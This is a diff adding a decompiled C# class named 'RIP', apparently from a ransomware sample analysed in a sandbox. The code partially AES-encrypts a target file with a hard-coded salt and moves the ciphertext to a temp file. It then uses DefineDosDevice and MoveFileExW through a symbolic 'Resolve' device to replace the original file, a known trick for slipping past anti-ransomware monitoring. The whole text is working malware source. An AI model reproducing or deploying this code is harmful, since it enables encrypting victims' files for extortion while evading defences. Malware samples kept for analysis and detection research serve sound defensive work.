@@ -1,0 +1,110 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: Complex.RIP
+// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: 10231E92-BCE6-4007-A463-67D77912E754
+// Assembly location: C:\Users\WDAGUtilityAccount\Desktop\5d40615701c48a122e44f831e7c8643d07765629a83b15d090587f469c77693d
+
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace Complex
+{
+  public class RIP
+  {
+    [DllImport("kernel32.dll")]
+    private static extern bool DefineDosDevice(
+      uint dwFlags,
+      string lpDeviceName,
+      string lpTargetPath);
+
+    public static void Cleanup(string fileToDelete = null)
+    {
+      try
+      {
+        RIP.DefineDosDevice(3U, "Resolve", string.Empty);
+      }
+      catch
+      {
+      }
+    }
+
+    private static bool PrepareToRipIt(string targetFilePath, out string encryptedFilePath)
+    {
+      byte[] encrypted = Encryptions.AESEncryptBytes(Encryptions.ReadFromFile(targetFilePath, Convert.ToInt32(Program.PartialSize) * 1024 * 1024), Encoding.ASCII.GetBytes(Program.DynamicPass), new byte[8]
+      {
+        (byte) 1,
+        (byte) 2,
+        (byte) 3,
+        (byte) 4,
+        (byte) 5,
+        (byte) 6,
+        (byte) 7,
+        (byte) 8
+      });
+      encryptedFilePath = string.Empty;
+      string empty = string.Empty;
+      string str1;
+      try
+      {
+        str1 = Path.GetTempPath() + "\\";
+      }
+      catch
+      {
+        return false;
+      }
+      string str2;
+      do
+      {
+        str2 = Guid.NewGuid().ToString();
+      }
+      while (File.Exists(str1 + str2));
+      encryptedFilePath = str1 + str2;
+      try
+      {
+        File.Move(targetFilePath, encryptedFilePath);
+        Encryptions.WriteToFile(encryptedFilePath, encrypted);
+      }
+      catch
+      {
+        return false;
+      }
+      return true;
+    }
+
+    private static bool RipIt(string sourceFilePath, string destinationFilePath)
+    {
+      try
+      {
+        if (!RIP.DefineDosDevice(1U, "Resolve", "\\??\\" + destinationFilePath))
+          return false;
+        if (!Program.MoveFileExW(sourceFilePath, "\\\\.\\Resolve", 9U))
+          return false;
+      }
+      catch
+      {
+        return false;
+      }
+      return true;
+    }
+
+    public static bool Start(string targetFilePath)
+    {
+      string encryptedFilePath = "";
+      RIP.Cleanup();
+      if (!RIP.PrepareToRipIt(targetFilePath, out encryptedFilePath))
+      {
+        RIP.Cleanup(encryptedFilePath);
+        return false;
+      }
+      if (!RIP.RipIt(encryptedFilePath, targetFilePath))
+      {
+        RIP.Cleanup(encryptedFilePath);
+        return false;
+      }
+      RIP.Cleanup();
+      return true;
+    }
+  }
+}
